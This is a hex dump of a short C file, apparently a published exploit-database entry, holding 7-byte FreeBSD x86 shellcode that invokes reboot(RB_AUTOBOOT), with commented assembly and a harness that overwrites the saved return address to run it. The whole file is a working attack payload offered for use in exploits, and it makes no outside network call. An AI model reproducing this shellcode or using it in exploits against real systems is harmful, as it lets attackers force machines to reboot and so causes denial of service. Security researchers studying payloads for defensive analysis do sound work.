00000000  2f 2a 0d 0a 20 2a 0d 0a  20 2a 20 46 72 65 65 42  |/*.. *.. * FreeB|
00000010  53 44 5f 78 38 36 2d 72  65 62 6f 6f 74 2d 37 62  |SD_x86-reboot-7b|
00000020  2e 63 20 28 53 68 65 6c  6c 63 6f 64 65 2c 20 72  |.c (Shellcode, r|
00000030  65 62 6f 6f 74 28 52 42  5f 41 55 54 4f 42 4f 4f  |eboot(RB_AUTOBOO|
00000040  54 29 2c 20 37 20 62 79  74 65 73 29 0d 0a 20 2a  |T), 7 bytes).. *|
00000050  0d 0a 20 2a 20 62 79 20  49 5a 20 3c 20 67 75 65  |.. * by IZ < gue|
00000060  72 72 69 6c 6c 61 2e 73  79 74 65 73 2e 6e 65 74  |rrilla.sytes.net|
00000070  20 3e 0d 0a 20 2a 0d 0a  20 2a 2f 0d 0a 0d 0a 0d  | >.. *.. */.....|
00000080  0a 63 68 61 72 20 73 68  65 6c 6c 63 6f 64 65 5b  |.char shellcode[|
00000090  5d 20 3d 0d 0a 22 5c 78  33 31 5c 78 63 30 22 20  |] =.."\x31\xc0" |
000000a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000b0  20 2f 2a 20 78 6f 72 20  25 65 61 78 2c 25 65 61  | /* xor %eax,%ea|
000000c0  78 20 2a 2f 0d 0a 0d 0a  22 5c 78 35 30 22 20 20  |x */...."\x50"  |
000000d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000e0  20 20 20 20 2f 2a 20 70  75 73 68 20 25 65 61 78  |    /* push %eax|
000000f0  20 2a 2f 0d 0a 22 5c 78  62 30 5c 78 33 37 22 20  | */.."\xb0\x37" |
00000100  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000110  20 2f 2a 20 6d 6f 76 20  24 30 78 33 37 2c 25 61  | /* mov $0x37,%a|
00000120  6c 20 2a 2f 0d 0a 22 5c  78 63 64 5c 78 38 30 22  |l */.."\xcd\x80"|
00000130  3b 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |;               |
00000140  20 20 2f 2a 20 69 6e 74  20 24 30 78 38 30 20 2a  |  /* int $0x80 *|
00000150  2f 0d 0a 0d 0a 0d 0a 76  6f 69 64 20 6d 61 69 6e  |/......void main|
00000160  28 29 0d 0a 7b 0d 0a 20  20 20 20 20 69 6e 74 2a  |()..{..     int*|
00000170  20 20 20 20 20 72 65 74  3b 20 20 20 20 20 20 20  |     ret;       |
00000180  20 20 0d 0a 0d 0a 20 20  20 20 20 72 65 74 20 3d  |  ....     ret =|
00000190  20 28 69 6e 74 2a 29 20  26 72 65 74 20 2b 20 32  | (int*) &ret + 2|
000001a0  3b 0d 0a 0d 0a 20 20 20  20 20 70 72 69 6e 74 66  |;....     printf|
000001b0  28 22 6c 65 6e 20 25 64  5c 6e 22 2c 73 74 72 6c  |("len %d\n",strl|
000001c0  65 6e 28 73 68 65 6c 6c  63 6f 64 65 29 29 3b 0d  |en(shellcode));.|
000001d0  0a 0d 0a 20 20 20 20 20  28 2a 72 65 74 29 20 3d  |...     (*ret) =|
000001e0  20 28 69 6e 74 29 20 73  68 65 6c 6c 63 6f 64 65  | (int) shellcode|
000001f0  3b 20 0d 0a 7d                                    |; ..}|
000001f5
